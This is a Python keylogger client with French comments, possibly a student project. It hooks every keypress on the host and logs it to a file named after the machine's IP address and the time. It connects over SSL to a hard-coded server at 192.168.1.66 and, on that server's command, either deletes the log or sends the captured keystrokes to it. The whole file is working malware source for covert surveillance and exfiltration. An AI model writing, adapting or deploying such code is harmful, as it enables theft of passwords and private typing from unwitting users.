import keyboard, socket, functions, threading
from queue import Queue
from time import strftime

ip_host = socket.gethostbyname(socket.gethostname())
time = strftime("%Y-%m-%d_%H-%M-%S")
file_name = ip_host + "-" + time + "-keyboard.txt"
ip_server = "192.168.1.66"
ports = functions.scan_port(ip_server)
client_ssl = Queue()

# Utiliser un thread pour se connecter
thread = threading.Thread(target=functions.connexion, args=(ip_server, ports, client_ssl))
thread.start()

sys = functions.detect_os()

file_path = functions.creation_fichier(file_name, sys)

# Active le mode d'enregistrement des touches
keyboard.on_press(lambda event: functions.touche_fichier(file_path, event))
try:
    # Maintient le programme en cours d'exécution
    keyboard.wait("esc")
    print("Fin de l'écoute ...")
except KeyboardInterrupt:
    pass

# Arrêt du thread et récupération des informations
thread.join()
resultat = client_ssl.get()

if resultat == "exit":
    print("Arrêt du programme...")

    # Désactive le mode d'enregistrement global des touches
    keyboard.unhook_all()

elif resultat == "kill":
    print("Arrêt du programme et suppression du fichier...")

    # Désactive le mode d'enregistrement global des touches
    keyboard.unhook_all()

    # Supprime le fichier
    functions.suppression_fichier(file_path)

else :
    # Désactive le mode d'enregistrement global des touches
    keyboard.unhook_all()

    # Envoi du fichier au serveur distant via un socket
    functions.client(file_path, resultat)


